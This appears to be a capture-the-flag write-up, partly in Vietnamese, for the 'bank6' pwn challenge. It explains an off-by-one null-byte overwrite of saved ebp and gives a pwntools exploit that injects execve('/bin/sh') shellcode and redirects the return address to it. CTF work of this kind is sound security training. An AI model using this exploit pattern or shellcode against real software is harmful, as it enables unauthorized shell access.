# **bank6**

# Task

nc 61.28.237.24 30207

File: bank6

## Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  welcome();
  puts("[+] Good bye!");
  return 0;
}
```

```c
void welcome()
{
  puts("[+] Welcome");
  Register();
}
```

```c
void Register()
{
  char name[1024]; // [esp+Ch] [ebp-40Ch] BYREF
  int balance; // [esp+40Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Here is a gift: %p\n", name);
  printf("[+] Please enter your name: ");
  __isoc99_scanf("%1036s", name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```

![image](https://user-images.githubusercontent.com/31529599/120055810-9be90600-c062-11eb-9171-6ce595a56b1f.png)

bài này nhận input bằng `scanf` và format string của nó chứa giới hạn nhập vào là `1036` nên không thể nào overwrite return address 

tuy nhiên khi debug bằng `gdb` thì ta sẽ dễ dàng thấy có thể overwrite được 1 bytes cuối của `ebp` (nghĩa là sau khi nhập số ký tự >= 1036) thì hàm này sẽ đặt một terminate character ở cuối là vị trí thứ 1037 chính là byte cuối cùng của `ebp`) cho nên ta sẽ biết được giá trị trả về sẽ lần lượt là nằm ở:

`ebp` cho hàm `Register`
`ebp+4` cho hàm `Welcome`

vậy ta sẽ overweite 1 bytes cuối của `ebp` để `ebp+4` sẽ nằm trên vùng input của biến `name` sau đó ta overwrite `ebp+4` chính là địa chỉ trả về của hàm `Welcome` với địa chỉ của shellcode (địa chỉ của biến `name`)

## Exploit

```python
from pwn import *

binary = context.binary = ELF('./bank6')

p = process('./bank6')
#p = remote('61.28.237.24', '30207')

p.recvuntil('Here is a gift: ')

shelladdr = int(p.recvline().strip(), 16) # lấy địa chỉ của biến name chính là địa chỉ của shellcode 

# shellcode execve để gọi bash shell
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x08\x40\x40\x40\xcd\x80"


# khoảng cách giữa địa chỉ biến name với địa chỉ ebp sau khi overwrite byte cuối
dis = (((shelladdr + 1036) >> 8) << 8) - shelladdr

# inject payload ngay đầu chuỗi nhập (địa chỉ biến name)
payload = shellcode

# padding từ cuối shellcode đến vị trí ebp+4 
payload += b'A'*(dis+4-len(payload))

# ghi vào ebp+4 địa chỉ của shellcode
payload += p32(shelladdr)

# padding đủ 1036 byte để overwrite byte cuối ebp để ebp+4 nằm trong khoảng 1036 byte input name
payload += b'A'*(0x40c-len(payload))





f = open('solve.txt', 'wb')

f.write(payload)
p.sendline(payload)

p.interactive()


```

# Run script
vì server đã đóng nên mình tiến hành khai thác local với file flag.txt HCMUSCTF{bank6}

![image](https://user-images.githubusercontent.com/31529599/120056239-17e44d80-c065-11eb-9f60-399be3c1ffe0.png)

Xong !

